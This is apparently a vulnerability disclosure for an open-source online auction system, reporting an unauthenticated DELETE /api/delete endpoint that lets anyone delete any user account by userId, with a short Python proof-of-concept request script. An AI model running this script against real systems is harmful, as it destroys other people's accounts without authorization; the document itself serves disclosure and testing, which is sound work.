# Unauthenticated Arbitrary User Deletion  [Kipa Auction – Online Auction System](https://github.com/amitrajstm/online-auction-system)

## 🎯 Executive Summary
An unauthenticated attacker can delete any user account by simply knowing or guessing their userId. The endpoint DELETE /api/delete lacks any form of authorization check (JWT, session, or role validation) and improperly trusts user-supplied userId from the request body.

Impact:

- ✅ Complete loss of user accounts
- ✅ Disruption of auction platform operations
- ✅ Potential reputational damage & legal liability

## 🧠 Vulnerability Details

📍 Location - https://github.com/amitrajstm/online-auction-system/blob/main/server/routes/user.js

- No authentication middleware protecting the /delete route
- No authorization check comparing the requested userId with the logged-in user's identity
- Trusting client-supplied userId without verifying ownership or permissions

## 💥 Proof of Concept (PoC)

```python
import requests
import json

url = "https://localhost/api/delete"

payload = {
    "userId": "6907e0e8f26113e4ac064f09"  # Victim's user ID
}

headers = {
    "Content-Type": "application/json"
}

try:
    response = requests.delete(url, json=payload, headers=headers)
    
    print(f"📡 Status Code: {response.status_code}")
    print(f"📄 Server Response: {response.text}")
    
    if response.status_code == 200:
        print("⚠️ VULNERABLE: User successfully deleted without authentication!")
    elif response.status_code == 401 or response.status_code == 403:
        print("✅ Protected: Authorization required.")
    else:
        print("❓ Unexpected response. Manual verification needed.")
        
except requests.exceptions.RequestException as e:
    print(f"🔥 Error: {e}")
```
